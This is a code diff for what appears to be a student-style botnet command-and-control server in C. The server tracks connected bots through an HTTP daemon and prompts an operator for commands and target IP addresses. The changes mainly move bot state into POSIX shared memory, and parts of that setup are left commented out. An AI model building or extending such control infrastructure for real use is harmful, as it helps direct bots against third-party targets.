@@ -25,7 +25,7 @@
 
 active_bots *botnet = NULL; // Shared memory!
 sem_t r, w;
-int readcount, ret, sock_fd;
+int readcount, ret, fd_shm;
 struct MHD_Daemon *mhd_daemon;
 
 int botExists(int bot_id);
@@ -42,6 +42,7 @@ int setBotInfo(long *bot_port, char *bot_ip, int bot_id);
 int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                    const char *method, const char *version, const char *upload_data,
                    size_t *upload_data_size, void **con_cls);
+void initSHM();
 
 void updateBotInfo(int bot_id, char *target_ip, char *command);
 
@@ -84,9 +85,10 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
 int main(int argc, char const *argv[])
 {
 
-    int bot_fd, pid;
+    int pid;
 
-    ret = initializeSemaphores();
+    initializeSemaphores();
+    initSHM();
 
     botnet = (active_bots *)malloc(sizeof(active_bots));
     if (botnet == NULL)
@@ -120,11 +122,12 @@ int main(int argc, char const *argv[])
 // ! ########################################################### PARENT ######################################################################################
 void parent(int pid)
 {
+    
     while (1)
     {
 
         char command[10];
-        printf("\nInsert Command : \n");
+        printf("\nInsert Command : ");
         fgets(command, 10, stdin);
 
         if (strcmp(command, LIST) == 0)
@@ -143,11 +146,7 @@ void parent(int pid)
             {
                 handle_error("Failed to close semaphores");
             }
-            ret = close(sock_fd);
-            if (ret < 0)
-            {
-                handle_error("Failed to close socket");
-            }
+            
 
             MHD_stop_daemon(mhd_daemon);
 
@@ -194,6 +193,7 @@ void parent(int pid)
 void child()
 {
 
+    
     const union MHD_ConnectionInfo *conninfo;
 
     mhd_daemon = MHD_start_daemon(MHD_USE_SELECT_INTERNALLY, 8081, NULL, NULL, &handle_request, NULL, MHD_OPTION_END);
@@ -246,7 +246,7 @@ void sendCommand(char *command, int bot_id)
         printf("Submit target's ip in dot decimal notation: \n");
         fgets(target_ip, sizeof(target_ip), stdin);
 
-        updateBotInfo(bot_id, 16, command);
+        updateBotInfo(bot_id, target_ip, command);
 
         // * BUILDING REQUEST
         url = (char *)malloc(sizeof(target_ip) + sizeof(PROTOCOL));
@@ -480,6 +480,12 @@ int closeSemaphores()
     ret = sem_destroy(&w);
     if (ret < 0)
         handle_error("Cannot close sem w");
+
+
+    close(fd_shm);
+    if(munmap(botnet,sizeof(active_bots)));
+    if(shm_unlink(SHM_NAME)) handle_error("errore SHM_UNLINK");
+
     return ret;
 }
 
@@ -685,4 +691,21 @@ void updateBotInfo(int bot_id, char *target_ip, char *command)
     {
         handle_error("Error in post sem w");
     }
+}
+
+void initSHM(){
+
+    shm_unlink(SHM_NAME);
+    fd_shm=shm_open(SHM_NAME,O_CREAT|O_RDWR,0666);
+    if(fd_shm==-1) handle_error("errore shm_open");
+
+    ret=ftruncate(fd_shm,sizeof(active_bots));
+    if(ret) handle_error("errore truncate");
+
+    // botnet=mmap(0,sizeof(active_bots),PROT_READ|PROT_WRITE,MAP_SHARED,fd_shm,0);
+    // if(botnet==MAP_FAILED) handle_error("errore mmap");
+
+    // memset(botnet,0,sizeof(active_bots));   
+
+
 }
